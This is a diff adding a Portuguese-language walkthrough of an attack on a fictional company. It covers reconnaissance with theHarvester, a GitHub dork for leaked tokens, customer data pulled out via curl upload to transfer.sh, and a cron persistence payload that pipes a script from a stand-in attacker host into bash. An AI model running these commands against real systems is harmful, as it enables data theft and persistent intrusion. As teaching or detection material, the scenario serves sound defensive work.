@@ -1,0 +1,31 @@
+Durante o reconhecimento inicial, o atacante usou ferramentas como o theHarvester para coletar informações de domínio e subdomínios:
+
+theHarvester -d acme-corp.com -b google
+
+Descobriu-se que a empresa usava um aplicativo SaaS em accounts.acme-corp.com, com login federado via OAuth2. Através de pesquisas públicas no GitHub (Google Dorking), foi possível encontrar tokens de acesso válidos em repositórios negligenciados:
+
+site:github.com "acme-corp.com" "Bearer"
+
+Com isso, o atacante pôde autenticar-se na plataforma com:
+
+curl -H "Authorization: Bearer eyJhbGci..." https://accounts.acme-corp.com/api/user
+
+Uma vez autenticado, foi possível listar buckets S3 através de APIs internas:
+
+curl https://cloud.acme-corp.com/api/buckets/list
+
+Com acesso aos dados sensíveis, o atacante executou compressão antes da exfiltração:
+
+tar -czf dump.tar.gz /data/clientes
+
+E utilizou o serviço legítimo transfer.sh para extrair os dados de forma camuflada:
+
+curl --upload-file dump.tar.gz https://transfer.sh/dump.tar.gz
+
+Essa transferência passou despercebida por firewalls, uma vez que utilizava protocolo HTTPS na porta 443. Como persistência, foram criadas regras no painel de agendamento do SaaS para execuções periódicas de scripts maliciosos com:
+
+POST /api/scheduler HTTP/1.1
+{ "cron": "*/15 * * * *", "action": "wget -qO- http://attacker.site/backdoor.sh
+ | bash" }
+
+Além disso, o atacante configurou execução sob a forma de painel de controle (Control Panel Items) para interagir com usuários menos experientes internamente.
